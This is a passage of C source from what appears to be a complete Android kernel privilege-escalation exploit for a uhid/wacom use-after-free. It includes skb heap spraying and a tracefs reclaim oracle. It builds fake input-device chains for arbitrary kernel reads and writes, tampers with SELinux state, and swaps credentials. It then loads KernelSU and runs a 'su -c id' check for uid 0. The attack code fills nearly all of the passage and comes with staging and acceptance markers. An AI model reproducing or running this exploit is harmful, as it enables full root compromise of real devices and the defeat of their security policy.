                     touch_dev, total, pattern);
                printf("[-] oracle miss: target slot not our skb\n");
                goto out;
            }
            /* Keep the kmem probe enabled (tracing off) so every later
             * pad retrigger can be checked against touch_dev. */
            trace_wr(TR_PATH "/tracing_on", "0");
            pc->touch_dev = touch_dev;
            pc->touch_known = 1;
            pc->oracle_live = 1;
            PLOG("oracle hit touch=%#llx depth=%ld pattern=%s\n",
                 touch_dev, total, pattern);
            printf("[+] oracle hit: target slot reclaimed by our skb "
                   "(depth %ld)\n", total);
            if (reclaim_calib_write(total, pattern) != 0)
                PLOG("calib write failed\n");
            if (getenv("CVE99491_ORACLE_ONLY")) {
                printf("[+] oracle-only stop touch=%#llx depth=%ld\n",
                       touch_dev, total);
                oracle_end();
                /* Port: --stage=oracle treats the verified reclaim as a
                 * successful run; nothing has been written to the kernel. */
                rc = 0;
                goto out;
            }
        } else {
            long cd = 0;
            unsigned long sysb = 0;

            if (reclaim_calib_load(&cd, pattern) == 0) {
                long want = cd * 4;

                if (want > burst)
                    burst = want;
                PLOG("calib depth=%ld burst=%ld pattern=%s\n", cd, burst,
                     pattern);
            }
            if (reclaim_sysfs_bound(&sysb) == 0 && sysb > 0) {
                if (sysb > 8192) {
                    PLOG("sysfs bound=%lu exceeds cap, using 8192\n", sysb);
                    sysb = 8192;
                }
                if ((long)sysb > burst)
                    burst = (long)sysb;
            }
            if (burst > 8192)
                burst = 8192;
            if (spray_fire(burst, sp) < 0)
                goto out;
        }
    }
    usleep(10000);
    {
        /* Spray first, then trigger a few times; the self-cell loop adds
         * its own refires if the first trigger did not land.  --stage=trigger
         * must fire exactly ONE pad report: each report appends two
         * input_values, and additional rounds would keep storing at
         * selinux_state+8,+16,... and eventually reach the policy pointer. */
        unsigned char rep[2] = { 0x02, 0x02 };
        int rounds = g_trigger_probe ? 1 : (int)g_prof.spray_trigger_rounds;

        for (int r = 0; r < rounds; r++) {
            (void)uhid_input_raw(pc->pad_fd, rep, sizeof(rep));
            usleep(25000);
        }
    }
    usleep(100000);
    pc->started = 1;
    rc = 0;
out:
    evdev_watch_close(&ecw);
    if (rc < 0) {
        /* never destroy the pad: the touch sibling may already be gone */
        if (fd_t >= 0) {
            uhid_destroy(fd_t);
            close(fd_t);
        }
        if (pc->pad_fd >= 0) {
            close(pc->pad_fd);
            pc->pad_fd = -1;
        }
    }
    if (evfd >= 0) {
        close(evfd);
        evfd = -1;
    }
    free(sp);
    free(pl);
    return rc;
}

static int pchain_re(struct pchain *pc, unsigned long long target,
                     unsigned etype, unsigned ecode, int evalue,
                     long respray_n) {
    unsigned char *pl = malloc(4096);
    unsigned char *sp = malloc(g_prof.spray_len);
    int rc = -1;

    if (fire_take() < 0)
        goto out;
    if (!pl || !sp || !pc->started)
        goto out;
    build_chain_payload(pl, pc->base, pc->slide, target,
                        (etype == EV_ABS) ? (pc->base + UHID_DATA_OFF + C_OFF_SCRATCH)
                                          : target,
                        etype, ecode, evalue);
    if (uhid_input2(pc->a->fd, pl, 1) < 0)
        goto out;
    usleep(1000);
    /* Clear the ring while the old skb still occupies the slot, so the
     * post-drain window before the spray stays as short as possible. */
    if (pc->oracle_live && pc->touch_known)
        trace_reset();
    spray_drain();
    build_chain_uaf(sp, g_prof.spray_len, pc->base);
    if (pc->oracle_live && pc->touch_known) {
        /* Every pad retrigger is preceded by an oracle-confirmed skb at
         * the captured touch pointer.  A blind report on a missed
         * respray calls input_event() on an unowned object. */
        unsigned char rep[2] = { 0x02, 0x02 };
        long cap = respray_n > 0 ? respray_n : (long)g_prof.spray_count;
        long total = 0;
        int hit = 0;

        if (cap < (long)g_prof.spray_burst_min)
            cap = (long)g_prof.spray_burst_min;
        if (trace_wr(TR_PATH "/tracing_on", "1") != 0)
            goto out;
        /* spray_drain() above freed every skb on this pinned CPU, so the
         * respray only has to walk that CPU's partial lists: local spray
         * plus a single-CPU ring scan hits in one or two chunks, while the
         * all-CPU fallback stays for the cold-slab case. */
        while (!hit && total < cap / 2) {
            long k = (long)g_prof.spray_burst_step;

            if (k > cap / 2 - total)
                k = cap / 2 - total;
            if (spray_local(k, sp) < 0)
                goto out;
            total += k;
            hit = oracle_spray_match(pc->touch_dev, g_pin_cpu);
            if (!hit && total < cap / 2 &&
                trace_wr(TR_PATH "/tracing_on", "1") != 0)
                goto out;
        }
        while (!hit && total < cap) {
            long k = (long)g_prof.spray_burst_step;

            if (k > cap - total)
                k = cap - total;
            if (spray_fire(k, sp) < 0)
                goto out;
            total += k;
            hit = oracle_spray_match(pc->touch_dev, -1);
            if (!hit && total < cap &&
                trace_wr(TR_PATH "/tracing_on", "1") != 0)
                goto out;
        }
        trace_wr(TR_PATH "/tracing_on", "0");
        if (!hit) {
            PLOG("oracle retrigger unconfirmed t=%#llx depth=%ld\n",
                 target, total);
            goto out;
        }
        PLOG("oracle retrigger t=%#llx depth=%ld\n", target, total);
        /* One report can be dropped before it reaches the pad handler;
         * the pre-filled num_vals survives until a pass actually runs,
         * so a few repeats are free once the chain has executed. */
        for (int r = 0; r < 2; r++) {
            (void)uhid_input_raw(pc->pad_fd, rep, sizeof(rep));
            usleep(4000);
        }
        rc = 0;
    } else {
        /* No captured pointer: same interleave as the bootstrap fire, a
         * refire that lands on any round gets its chain walk from that
         * round's trigger. */
        unsigned char rep[2] = { 0x02, 0x02 };
        int rounds = (int)g_prof.spray_respray_rounds;

        if (rounds < 1)
            rounds = 8;
        /* Each blind report on a missed reclaim feeds whatever object owns
         * the slot to input_event(); the pre-filled entry survives a
         * dropped report, so a few reports cover the useful cases. */
        if (rounds > 3)
            rounds = 3;
        for (int r = 0; r < rounds; r++) {
            /* First round gets the full respray so every CPU receives
             * respray_n/ncpu (512 for 4096); later rounds only top up. */
            long k = (r == 0) ? respray_n : respray_n / rounds;

            if (k < (long)g_prof.spray_burst_min)
                k = (long)g_prof.spray_burst_min;
            if (g_spread_ms > 0
                    ? spray_spread(k, g_spread_ms / rounds, sp) < 0
                    : spray_fire(k, sp) < 0)
                goto out;
            (void)uhid_input_raw(pc->pad_fd, rep, sizeof(rep));
            usleep(8000);
        }
        usleep(150000);
        rc = 0;
    }
out:
    free(sp);
    free(pl);
    return rc;
}

/* One dance fire that writes {EV_PWR, code, value} at `target` through the
 * persistent chain (full drain + respray: one chain write per spray). */
static int pc_write(struct pchain *pc, unsigned long long target,
                    unsigned ecode, int evalue, long spray_n) {
    int rc = pchain_re(pc, target, EV_PWR, ecode, evalue, spray_n);
    spray_drain();
    return rc;
}

/* --- uinput-triggered persistent chain --------------------------------
 *
 * The pad report path can only re-arm the fake dev that lives in the
 * reclaimed skb, and input_event_dispose() resets that dev's num_vals to 0
 * after every pass; each chain write therefore needs a fresh reclaim.
 *
 * Once a uinput input_dev - whose events are fully controlled from
 * userspace - has dev->grab = H, the trigger is just a write(2) on
 * /dev/uinput: the input core passes the injected EV_PWR/EV_ABS value
 * straight to the anchor's fake handle.  Only the two grab halves still
 * need the pad chain; every later write rewrites the anchor chain with
 * UHID_INPUT2 and injects one event, with no UAF and no respray.
 *
 * EV_ABS chain writes rotate through several absolute axes because the
 * uinput input_dev keeps its own input_absinfo[code].value and the input
 * core drops an EV_ABS event whose value equals the stored one.  The
 * fake D's absinfo base is shifted by -code*sizeof(input_absinfo), so
 * absinfo[code].value still lands exactly on the requested target.
 *
 * EV_SYN chain writes send a leading EV_PWR value (dropped by D's evbit)
 * followed by SYN_REPORT; the uinput flush then passes the sync record,
 * whose 8-byte input_value is all zero, to the fake handle.
 */
static int g_uin_fd = -1;
static int g_uchain;
static unsigned g_abs_rot;
static unsigned g_abs_axis[32];
static int g_abs_val[32]; /* uinput input_dev absinfo[axis].value mirror */
static unsigned g_nabs;

static int uinput_trigger_open(void) {
    struct uinput_setup us;
    int fd;
    unsigned c;

    fd = open("/dev/uinput", O_RDWR | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
        PLOG("uinput open failed: %s\n", strerror(errno));
        return -1;
    }
    if (ioctl(fd, UI_SET_EVBIT, EV_PWR) < 0 ||
        ioctl(fd, UI_SET_EVBIT, EV_ABS) < 0) {
        PLOG("uinput evbit failed: %s\n", strerror(errno));
        close(fd);
        return -1;
    }
    (void)ioctl(fd, UI_SET_EVBIT, EV_SYN);
    g_nabs = 0;
    for (c = 0; c < 32; c++) {
        if (ioctl(fd, UI_SET_ABSBIT, c) == 0)
            g_abs_axis[g_nabs++] = c;
    }
    if (g_nabs < 8) {
        PLOG("uinput abs axes only %u\n", g_nabs);
        close(fd);
        return -1;
    }
    memset(&us, 0, sizeof(us));
    us.id.bustype = BUS_VIRTUAL;
    us.id.vendor = WACOM_VID;
    us.id.product = 0x9941;
    snprintf((char *)us.name, sizeof(us.name), "wacom-chain-trigger");
    if (ioctl(fd, UI_DEV_SETUP, &us) < 0 ||
        ioctl(fd, UI_DEV_CREATE) < 0) {
        PLOG("uinput create failed: %s\n", strerror(errno));
        close(fd);
        return -1;
    }
    usleep(50000);
    g_uin_fd = fd;
    g_abs_rot = 0;
    memset(g_abs_val, 0, sizeof(g_abs_val));
    PLOG("uinput trigger fd=%d axes=%u\n", fd, g_nabs);
    return 0;
}

static int uinput_send(unsigned type, unsigned code, int value) {
    struct input_event ev[2];

    memset(ev, 0, sizeof(ev));
    ev[0].type = (unsigned short)type;
    ev[0].code = (unsigned short)code;
    ev[0].value = value;
    ev[1].type = EV_SYN;
    ev[1].code = SYN_REPORT;
    ev[1].value = 0;
    return write(g_uin_fd, ev, sizeof(ev)) == (ssize_t)sizeof(ev) ? 0 : -1;
}

/* One chain write with no reclaim: rewrite the anchor chain, then inject
 * the event that drives it.  `etype` is EV_PWR (8-byte input_value at
 * target), EV_ABS (4-byte absinfo store at target) or EV_SYN (8-byte zero
 * record at target). */
static int uchain_re(struct pchain *pc, unsigned long long target,
                     unsigned etype, unsigned ecode, int evalue) {
    unsigned char *pl = malloc(4096);
    unsigned long long scratch = pc->base + UHID_DATA_OFF + C_OFF_SCRATCH;
    unsigned axis = 0;
    int rc = -1;

    if (!pl)
        return -1;
    if (!g_uchain || !pc->started)
        goto out;
    if (etype == EV_ABS) {
        axis = g_abs_axis[g_abs_rot++ % g_nabs];
        /* The uinput input_dev drops an EV_ABS event whose value equals
         * its own absinfo[axis].value, so a zero store on a fresh axis
         * would never reach the chain.  Preload a different value into
         * that axis with a harmless scratch write first. */
        if (g_abs_val[axis] == evalue) {
            int prime = evalue ^ 0x5a5a5a5a;

            build_chain_payload_ex(pl, pc->base, pc->slide, scratch,
                                   scratch, EV_ABS, axis, prime, axis);
            if (uhid_input2(pc->a->fd, pl, 1) < 0)
                goto out;
            usleep(1000);
            if (uinput_send(EV_ABS, axis, prime) < 0)
                goto out;
            g_abs_val[axis] = prime;
            usleep(1000);
        }
        build_chain_payload_ex(pl, pc->base, pc->slide, target, scratch,
                               EV_ABS, axis, evalue, axis);
        if (uhid_input2(pc->a->fd, pl, 1) < 0)
            goto out;
        usleep(1000);
        if (uinput_send(EV_ABS, axis, evalue) < 0)
            goto out;
        g_abs_val[axis] = evalue;
    } else if (etype == EV_PWR) {
        build_chain_payload(pl, pc->base, pc->slide, target, target,
                            EV_PWR, ecode, evalue);
        if (uhid_input2(pc->a->fd, pl, 1) < 0)
            goto out;
        usleep(1000);
        if (uinput_send(EV_PWR, ecode, evalue) < 0)
            goto out;
    } else if (etype == EV_SYN) {
        struct input_event ev[2];

        build_chain_payload(pl, pc->base, pc->slide, target, target,
                            EV_SYN, ecode, evalue);
        if (uhid_input2(pc->a->fd, pl, 1) < 0)
            goto out;
        usleep(1000);
        /* D's evbit admits only EV_SYN; the leading EV_PWR value is
         * dropped but forces the uinput flush to pass the SYN_REPORT
         * record, which is the 8-byte zero write at target. */
        memset(ev, 0, sizeof(ev));
        ev[0].type = EV_PWR;
        ev[1].type = EV_SYN;
        ev[1].code = SYN_REPORT;
        if (write(g_uin_fd, ev, sizeof(ev)) != (ssize_t)sizeof(ev))
            goto out;
    } else {
        goto out;
    }
    usleep(1000);
    rc = 0;
out:
    free(pl);
    return rc;
}

/* no-tracefs: a post-bootstrap miss is retried briefly and then parks;
 * there is no blind pad fallback. */
static int nt_write(struct pchain *pc, unsigned long long target,
                    unsigned etype, unsigned ecode, int evalue) {
    for (int t = 0; t < 4; t++) {
        if (uchain_re(pc, target, etype, ecode, evalue) == 0)
            return 0;
        usleep(1000);
    }
    return -1;
}

static int is_kptr(unsigned long long p) {
    return (p >> 48) == 0xffff && p != ~0ULL;
}

/*
 * capget() reads cred->cap_effective without dereferencing any cred
 * pointer other than the cred itself, so it is a safe probe while the
 * task's cred is being swapped (getuid() would deref cred->user_ns).
 */
#ifndef __NR_capget
#define __NR_capget 90 /* generic arm64 syscall table */
#endif

struct cap_hdr {
    uint32_t version;
    int pid;
};
struct cap_data {
    uint32_t effective, permitted, inheritable;
};

static int probe_caps(unsigned long long *eff) {
    struct cap_hdr hdr = { CAP_VERSION_3, 0 };
    struct cap_data data[2];
    memset(data, 0, sizeof(data));
    if (syscall(__NR_capget, &hdr, data) < 0)
        return -1;
    *eff = ((unsigned long long)data[1].effective << 32) | data[0].effective;
    return 0;
}

/* --- arbitrary read through the uhid output queue -------------------- */

static unsigned char *g_rd_page;

static int rd_page_setup(void) {
    if (g_rd_page)
        return 0;
    g_rd_page = mmap(NULL, 8192, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_rd_page == MAP_FAILED) {
        g_rd_page = NULL;
        return -1;
    }
    if (mprotect(g_rd_page + 4096, 4096, PROT_NONE) != 0)
        return -1;
    return 0;
}

/*
 * Arbitrary 4 KiB kernel read through uhid_char_read: outq[tail] is pointed
 * at the target and the user buffer ends on a PROT_NONE page, so
 * copy_to_user() faults after one page and the kernel takes the -EFAULT
 * path without kfree()ing the target.  The persistent chain
 * (pchain_read64) installs head/tail and outq[0] before each read.  The
 * anchor must be held forever afterwards: uhid_char_release() kfree()s
 * every non-NULL outq slot.
 */
static int outq_read(struct anchor *a, unsigned char *out, size_t n) {
    if (rd_page_setup() < 0)
        return -1;
    if (n > 4096)
        n = 4096;
    errno = 0;
    ssize_t r = read(a->fd, g_rd_page, 4380);
    if (r >= 0) {
        fprintf(stderr, "[-] outq read completed; target slot may be freed\n");
        return -1;
    }
    if (errno == EAGAIN)
        return 1; /* head == tail: arming lost */
    if (errno != EFAULT)
        return -1;
    memcpy(out, g_rd_page, n);
    return 0;
}

/* --- armed holders --------------------------------------------------- */

/*
 * Detached holder: record PARKED for this boot, drop the runner's stdio
 * pipe, and sleep forever with the armed descriptors open.  A PARKED
 * marker means this boot must not run another fire run.
 */
static void park_holder(void) __attribute__((noreturn));
static void park_holder(void) {
    int nul;

    if (g_patch_w >= 0) {
        close(g_patch_w);
        g_patch_w = -1;
    }
    (void)cve99491_parked_mark_in(g_run_dir);
    (void)setsid();
    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    nul = open("/dev/null", O_RDWR);
    if (nul >= 0) {
        dup2(nul, 0);
        dup2(nul, 1);
        dup2(nul, 2);
        if (nul > 2)
            close(nul);
    }
    for (;;)
        pause();
}

/* Port helper: fork the detached holder (keeps the armed uhid descriptors
 * alive and records PARKED) and return to the parent.  Stage gates fork it
 * before touching cred state so the holder keeps clean credentials. */
static void spawn_armed_holder(void) {
    pid_t h = fork();

    if (h == 0)
        park_holder();
    printf("[+] armed holder pid %d\n", (int)h);
}

/* Port helper: leave a staged run successfully.  The holder was already
 * forked (or no armed state is left); the runner's exit status is `code`. */
static void finish_stage_ok(void) __attribute__((noreturn));
static void finish_stage_ok(void) {
    oracle_shutdown();
    fflush(NULL);
    _exit(0);
}

/* Port helper: zero outq[0] through the persistent/uinput chain so the
 * anchor release path can only kfree(NULL).  Returns 1 on success.  Shared
 * by the full endgame and the staged gates. */
static int disarm_outq_chain(struct pchain *pa, long spray_n) {
    for (int i = 0; i < 3; i++) {
        if (g_uchain) {
            if (uchain_re(pa, pa->base + UHID_OUTQ_OFF, EV_SYN, SYN_REPORT,
                          0) < 0)
                continue;
            return 1;
        }
        if (pchain_re(pa, pa->base + UHID_OUTQ_OFF, EV_SYN, SYN_REPORT, 0,
                      spray_n) < 0) {
            spray_drain();
            continue;
        }
        spray_drain();
        return 1;
    }
    return 0;
}

static long g_proc_t0;

/* --- self-contained late-load handoff --------------------------------
 *
 * The endgame used to be driven by an external shell script: exec a command
 * that runs the manager's libksud.so, poll /proc/modules, then patch the
 * vendor HAL domains from a second shell.  Everything now happens in this
 * binary:
 *
 *   1. ksu_locate_ksud() resolves <manager apk>/lib/arm64/libksud.so.
 *   2. After the cred swap the process execs itself as `late-load`, which
 *      runs that binary in place (same pid, same cred, full caps).
 *   3. The vendor HAL repair runs in a helper forked before the exploit:
 *      it stays uid 2000, waits on a pipe, and once late-load reports the
 *      module Live it pipes the statements into `libksud.so debug su`.
 *
 * The helper exists because ksud's debug-su path reaches the driver
 * through the setresuid hook; a process that is already uid 0 never makes
 * that transition (and dropping back is refused here), so the patch must
 * come from a process that never left uid 2000.
 */
static char g_ksud_lib[512];
static char g_ksud_kmi[64];

/* release "6.18.21-android17-5-g..." -> KMI "android17-6.18" */
static void ksu_derive_kmi(void) {
    const char *rel = g_prof.release;
    const char *and = strstr(rel, "-android");
    int andv = 0;
    int maj = 0, min = 0;

    if (and) {
        andv = atoi(and + 8);
        if (sscanf(rel, "%d.%d", &maj, &min) != 2) {
            maj = 0;
            min = 0;
        }
    }
    if (andv > 0 && maj > 0)
        snprintf(g_ksud_kmi, sizeof(g_ksud_kmi), "android%d-%d.%d", andv, maj,
                 min);
    else
        snprintf(g_ksud_kmi, sizeof(g_ksud_kmi), "android17-6.18");
}

/* Resolve the manager APK's ksud library.  Mirrors the plant tool: ask
 * pm path for the package, then look for the known library names. */
/* Obfuscated manager builds rename libksud.so; identify it by content. */
static int lib_has_ksud_str(const char *path) {
    static const char needle[] = "extract-binary";
    char buf[1 << 16];
    size_t nl = sizeof(needle) - 1, keep = 0;
    int fd = open(path, O_RDONLY);
    ssize_t n;

    if (fd < 0)
        return 0;
    for (;;) {
        n = read(fd, buf + keep, sizeof(buf) - keep);
        if (n <= 0)
            break;
        {
            size_t total = keep + (size_t)n;

            if (memmem(buf, total, needle, nl)) {
                close(fd);
                return 1;
            }
            keep = total < nl - 1 ? total : nl - 1;
            memmove(buf, buf + total - keep, keep);
        }
    }
    close(fd);
    return 0;
}

/* Ask the manager package where its APK lives.  Returns the directory
 * (…/pkg-XXXX) and leaves the full apk path in `apk` when given. */
static int ksu_manager_dir(char *dir, size_t dcap, char *apk, size_t acap) {
    char cmd[512], res[2048];
    FILE *f;
    char *p, *nl, *sfx;
    size_t dl;

    snprintf(cmd, sizeof(cmd), "pm path '%s' 2>/dev/null", g_prof.ksu_manager);
    f = popen(cmd, "r");
    if (!f)
        return -1;
    res[0] = 0;
    if (!fgets(res, sizeof(res), f)) {
        pclose(f);
        return -1;
    }
    pclose(f);
    p = strstr(res, "package:");
    if (!p)
        return -1;
    p += 8;
    nl = strchr(p, '\n');
    if (nl)
        *nl = 0;
    sfx = strstr(p, "/base.apk");
    if (!sfx)
        return -1;
    dl = (size_t)(sfx - p);
    if (dl >= dcap)
        dl = dcap - 1;
    memcpy(dir, p, dl);
    dir[dl] = 0;
    if (apk && acap)
        snprintf(apk, acap, "%s", p);
    return 0;
}

/* Resolve the manager's ksud library.  Order:
 *   1. CVE99491_KSU_LIB override
 *   2. known library names
 *   3. any lib*.so in lib/arm64 that carries the ksud "extract-binary"
 *      string (managers such as SukiSU Ultra ship it obfuscated)
 *   4. the same names pulled out of the APK with unzip when compressed
 */
static int ksu_locate_ksud(void) {
    static const char *libs[] = {
        "/lib/arm64/libksud.so", "/lib/arm64/libksud_lib.so",
        "/lib/arm64/libksud64.so", "/lib/arm64/libksu.so"
    };
    char dir[640], apk[640], path[800];
    struct dirent *de;
    DIR *d;

    if (g_ksud_lib[0])
        return 0;
    {
        const char *env = getenv("CVE99491_KSU_LIB");

        if (env && *env && access(env, X_OK) == 0) {
            snprintf(g_ksud_lib, sizeof(g_ksud_lib), "%s", env);
            return 0;
        }
    }
    /* Port addition (plan D3): prefer the deployed assets ksud for the
     * late-load handoff; the manager APK's libksud.so is the fallback.
     * The switch comes from the profile (ksu_backend) or the environment. */
    {
        const char *eb = getenv("CVE99491_KSU_BACKEND");
        const char *backend = (eb && *eb) ? eb : g_prof.ksu_backend;

        if (!backend || !*backend)
            backend = "auto";
        if (!strcmp(backend, "auto") || !strcmp(backend, "asset")) {
            struct stat st;

            if (g_prof.ksu_ksud_path[0] &&
                access(g_prof.ksu_ksud_path, X_OK) == 0 &&
                stat(g_prof.ksu_ksud_path, &st) == 0 &&
                st.st_size >= 2000000) {
                snprintf(g_ksud_lib, sizeof(g_ksud_lib), "%s",
                         g_prof.ksu_ksud_path);
                printf("[*] ksud backend=asset path=%s\n", g_ksud_lib);
                return 0;
            }
            if (!strcmp(backend, "asset")) {
                printf("[-] ksud backend=asset but %s is missing/too short\n",
                       g_prof.ksu_ksud_path);
                return -1;
            }
        }
        if (strcmp(backend, "auto") && strcmp(backend, "manager")) {
            printf("[-] unknown ksu_backend: %s\n", backend);
            return -1;
        }
    }
    if (ksu_manager_dir(dir, sizeof(dir), apk, sizeof(apk)) != 0)
        return -1;

    for (unsigned i = 0; i < sizeof(libs) / sizeof(libs[0]); i++) {
        struct stat st;

        snprintf(path, sizeof(path), "%s%s", dir, libs[i]);
        if (access(path, X_OK) == 0 && stat(path, &st) == 0 &&
            st.st_size >= 2000000) {
            snprintf(g_ksud_lib, sizeof(g_ksud_lib), "%s", path);
            return 0;
        }
    }

    snprintf(path, sizeof(path), "%s/lib/arm64", dir);
    d = opendir(path);
    if (d) {
        while ((de = readdir(d)) != NULL) {
            char cand[900];
            struct stat st;

            if (strncmp(de->d_name, "lib", 3) || !strstr(de->d_name, ".so"))
                continue;
            snprintf(cand, sizeof(cand), "%s/%s", path, de->d_name);
            if (access(cand, X_OK) != 0 || stat(cand, &st) != 0 ||
                st.st_size < 2000000)
                continue;
            if (lib_has_ksud_str(cand)) {
                snprintf(g_ksud_lib, sizeof(g_ksud_lib), "%s", cand);
                closedir(d);
                printf("[*] ksud probed: %s\n", de->d_name);
                return 0;
            }
        }
        closedir(d);
    }

    /* Compressed in the APK: stage a copy under the workdir. */
    if (apk[0]) {
        static const char *zents[] = {
            "lib/arm64-v8a/libksud.so", "lib/arm64/libksud.so"
        };

        for (unsigned i = 0; i < 2; i++) {
            struct stat st;
            char cmd[1400];

            snprintf(path, sizeof(path), "%s/ksud.tmp", g_prof.ksu_workdir);
            unlink(path);
            snprintf(cmd, sizeof(cmd),
                     "unzip -p '%s' '%s' > '%s' 2>/dev/null; chmod 755 '%s' "
                     "2>/dev/null",
                     apk, zents[i], path, path);
            if (system(cmd) != 0)
                continue;
            if (stat(path, &st) == 0 && st.st_size > 100000) {
                snprintf(g_ksud_lib, sizeof(g_ksud_lib), "%s", path);
                printf("[*] ksud staged from apk (%s)\n", zents[i]);
                return 0;
            }
        }
    }
    g_ksud_lib[0] = 0;
    return -1;
}

/* Run argv with stdout/stderr captured into out; returns the exit status. */
static int ksu_run_capture(char *const av[], char *out, size_t cap) {
    int pfd[2];
    pid_t pid;
    size_t used = 0;
    int status = 0;

    if (pipe(pfd) != 0)
        return -1;
    pid = fork();
    if (pid == 0) {
        close(pfd[0]);
        dup2(pfd[1], 1);
        dup2(pfd[1], 2);
        if (pfd[1] > 2)
            close(pfd[1]);
        execv(av[0], av);
        _exit(127);
    }
    close(pfd[1]);
    if (pid < 0) {
        close(pfd[0]);
        return -1;
    }
    for (;;) {
        ssize_t n;

        if (used + 1 >= cap)
            break;
        n = read(pfd[0], out + used, cap - 1 - used);
        if (n <= 0)
            break;
        used += (size_t)n;
    }
    out[used] = 0;
    close(pfd[0]);
    if (waitpid(pid, &status, 0) != pid)
        return -1;
    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}

/* Port: final acceptance probe for the full chain.  `su -c id` must report
 * uid=0 and the profile's KSU shell domain; the process already runs as uid 0
 * with full caps, so KernelSU's su takes its root path.  The [f] marker is
 * the machine-readable result the App waits for. */
static int port_su_check(void) {
    char cands[2][256];
    char out[512];
    char one[256];
    char *av[5];

    snprintf(cands[0], sizeof(cands[0]), "/system/bin/su");
    snprintf(cands[1], sizeof(cands[1]), "%s/su", g_prof.ksu_ksu_bin_dir);
    for (size_t i = 0; i < 2; i++) {
        size_t used = 0;

        if (access(cands[i], X_OK) != 0)
            continue;
        av[0] = cands[i];
        av[1] = (char *)"-c";
        av[2] = (char *)"id";
        av[3] = NULL;
        out[0] = 0;
        if (ksu_run_capture(av, out, sizeof(out)) != 0) {
            printf("[*] su_check candidate %s: rc!=0 (%s)\n", cands[i], out);
            continue;
        }
        /* Fold the captured output into one line for the marker contract. */
        for (size_t j = 0; out[j] && used + 1 < sizeof(one); j++) {
            char c = out[j];

            one[used++] = (c == '\n' || c == '\r' || c == '\t') ? ' ' : c;
        }
        while (used > 0 && one[used - 1] == ' ')
            used--;
        one[used] = 0;
        if (strstr(one, "uid=0") && strstr(one, "u:r=ksu:s0")) {
            printf("[f] su_check=%s\n", one);
            return 0;
        }
        printf("[*] su_check candidate %s: %s\n", cands[i], one);
    }
    printf("[-] su_check failed: no uid=0 / u:r=ksu:s0\n");
    printf("[f] su_check=FAILED\n");
    return -1;
}

/* `exp late-load`: exec'd in place by the real_cred endgame.  Runs the
 * manager's ksud late-load, waits for the module to go Live, then hands
 * the vendor HAL repair to `late-su` and restores Enforcing. */
static int ksu_late_load_main(void) {
    char *av[8];
    char out[4096];
    int rc, tries;

    ksu_derive_kmi();
    if (ksu_locate_ksud() != 0) {
        printf("[-] ksud library not found for %s\n", g_prof.ksu_manager);
        return 1;
    }
    printf("[*] ksud=%s kmi=%s\n", g_ksud_lib, g_ksud_kmi);
    av[0] = g_ksud_lib;
    av[1] = (char *)"late-load";
    av[2] = (char *)"--kmi";
    av[3] = g_ksud_kmi;
    av[4] = (char *)"--allow-shell";
    av[5] = (char *)"--package-name";
    av[6] = g_prof.ksu_manager;
    av[7] = NULL;
    out[0] = 0;
    rc = ksu_run_capture(av, out, sizeof(out));
    printf("[*] late-load rc=%d\n", rc);
    if (out[0])
        printf("%s", out);

    for (tries = 0; tries < 100; tries++) {
        FILE *f = fopen("/proc/modules", "r");
        char line[512];
        int live = 0;

        if (f) {
            while (fgets(line, sizeof(line), f))
                if (!strncmp(line, "kernelsu ", 9) && strstr(line, "Live")) {
                    live = 1;
                    break;
                }
            fclose(f);
        }
        if (live)
            break;
        usleep(50000);
    }
    printf("[*] module %s after %d polls\n", tries < 100 ? "Live" : "missing",
           tries);
    if (tries >= 100)
        return 1;
    /* App marker contract: module is Live in /proc/modules. */
    printf("MODULE_LOADED\n");

    /* Wake the uid-2000 helper for the vendor HAL repair.  The fd and
     * pid were handed over through the environment, so they survived the
     * in-place exec chain. */
    {
        const char *fds = getenv("CVE99491_PATCH_FD");
        const char *pids = getenv("CVE99491_PATCH_PID");
        int wfd = fds ? atoi(fds) : -1;
        pid_t pid = pids ? (pid_t)atoi(pids) : -1;
        int status = 0;

        if (wfd >= 0) {
            (void)!write(wfd, "1", 1);
            close(wfd);
        }
        if (pid > 0) {
            (void)waitpid(pid, &status, 0);
            printf("[*] patch helper exit=%d\n", WIFEXITED(status) ?
                   WEXITSTATUS(status) : -1);
        }
    }

    /* The helper restores Enforcing through `ksud debug su`; verify it and
     * fall back to selinuxfs directly (we carry full caps here). */
    if (selinux_enforce_now() != 1) {
        int fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);

        if (fd >= 0) {
            (void)!write(fd, "1", 1);
            close(fd);
        }
    }
    if (selinux_enforce_now() != 1) {
        printf("[-] enforcing not restored after late-load\n");
        printf("[f] module_live=1 enforce=%d\n", selinux_enforce_now());
        return 1;
    }
    printf("[f] module_live=1 enforce=1\n");

    /* Direct-engine runs the su acceptance from the uid-2000 parent (the
     * KSU sucompat path); an already-uid-0 actor would hit the setresuid
     * hook problem described in the real_cred notes. */
    if (!getenv("CVE99491_SKIP_SU_CHECK") && port_su_check() != 0)
        return 1;
    {
        const char *t0s = getenv("CVE99491_T0");
        long t0 = t0s ? strtol(t0s, NULL, 0) : 0;

        if (t0 > 0)
            printf("[+] TOTAL_SECONDS=%.1f\n",
                   (now_ms() - t0) / 1000.0);
    }
    return 0;
}

/* ksud's late-load restart hardcodes KernelSU's activity class, which the
 * rebranded managers do not ship; resolve the real launcher instead. */
static int ksu_manager_pid(void) {
    char cmd[320], out[256];
    char *av[4];

    snprintf(cmd, sizeof(cmd), "pidof '%s' 2>/dev/null", g_prof.ksu_manager);
    av[0] = (char *)"/system/bin/sh";
    av[1] = (char *)"-c";
    av[2] = cmd;
    av[3] = NULL;
    out[0] = 0;
    if (ksu_run_capture(av, out, sizeof(out)) != 0)
        return -1;
    return atoi(out);
}

/* Launcher components measured on the reference device.  SukiSU's alias
 * carries a per-release random prefix, so a miss falls back to
 * resolve-activity once. */
static const struct {
    const char *pkg;
    const char *activity;
} g_manager_activities[] = {
    { "me.weishu.kernelsu", "me.weishu.kernelsu/.ui.MainActivity" },
    { "com.sukisu.ultra", "com.sukisu.ultra/.ui.xopunrnhokqActivityAliasDefaultStatic" },
    { "com.resukisu.resukisu", "com.resukisu.resukisu/org.bakasu.bakasu.ui.MainActivity" },
    { "com.rifsxd.ksunext", "com.rifsxd.ksunext/.ui.MainActivity" },
    { "me.yuki.fina", "me.yuki.fina/me.weishu.kernelsu.ui.MainActivityDefault" },
